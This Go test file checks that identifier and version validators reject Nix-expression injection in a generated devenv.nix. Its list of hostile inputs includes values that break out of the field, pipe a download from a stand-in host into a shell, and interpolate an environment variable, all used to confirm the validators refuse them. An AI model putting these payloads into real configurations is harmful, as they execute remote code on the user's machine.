package validation

import (
	"strings"
	"testing"
)

func TestIdentifierValidators(t *testing.T) {
	t.Parallel()

	// Payloads that break out of an unquoted Nix position in devenv.nix.
	injections := []string{
		"16; }; processes.pwn.exec = ''curl evil.example | sh''; services.zz = { enable = false; package = pkgs.hello",
		"hello ]; enterShell = \"curl evil | sh\"; x = [ pkgs.hello",
		"X = 1; y",
		"a${builtins.getEnv \"HOME\"}",
		"a\nb",
		"a#comment",
		"https://evil.example/x",
		"(import x)",
		"",
	}

	tests := []struct {
		name  string
		fn    func(string) bool
		valid []string
	}{
		{"IsValidEnvKey", IsValidEnvKey, []string{"FOO", "_x", "DATABASE_URL", "a1"}},
		{"IsValidNixAttrPath", IsValidNixAttrPath, []string{"jq", "python3Packages.black", "gnu-sed", "_1password", "foo'"}},
		{"IsValidToken", IsValidToken, []string{"16", "16.2", "pnpm", "mariadb", "my-db_1"}},
		{"IsValidVersionConstraint", IsValidVersionConstraint, []string{"1.24", "3.12.1", ">=18 <21", "^20.0.0", "18.x || 20.x", "nightly-2024-01-01", "stable", "lts/iron", "lts/*"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			for _, v := range tt.valid {
				if !tt.fn(v) {
					t.Errorf("%s(%q) = false, want true", tt.name, v)
				}
			}
			for _, v := range injections {
				if tt.fn(v) {
					t.Errorf("%s(%q) = true, want false", tt.name, v)
				}
			}
			if tt.fn(strings.Repeat("a", 1024)) {
				t.Errorf("%s accepted a 1024-byte value", tt.name)
			}
		})
	}
}

func TestIdentifierValidators_RejectStructuralChars(t *testing.T) {
	t.Parallel()
	// No validator may accept a character that can end or open a Nix
	// expression, whatever surrounds it. '/' (a Nix path when unquoted) is
	// allowed only in language versions, which are always emitted quoted.
	for _, c := range []string{";", "{", "}", "[", "]", "(", ")", "\"", "'", "$", "/", ":", "#", "\t", "\n", "\\", "`", "@"} {
		v := "a" + c + "b"
		if IsValidToken(v) || IsValidEnvKey(v) {
			t.Errorf("value %q with %q accepted", v, c)
		}
		if c != "/" && IsValidVersionConstraint(v) {
			t.Errorf("version %q with %q accepted", v, c)
		}
		if c != "'" && IsValidNixAttrPath(v) {
			t.Errorf("attr path %q with %q accepted", v, c)
		}
	}
}
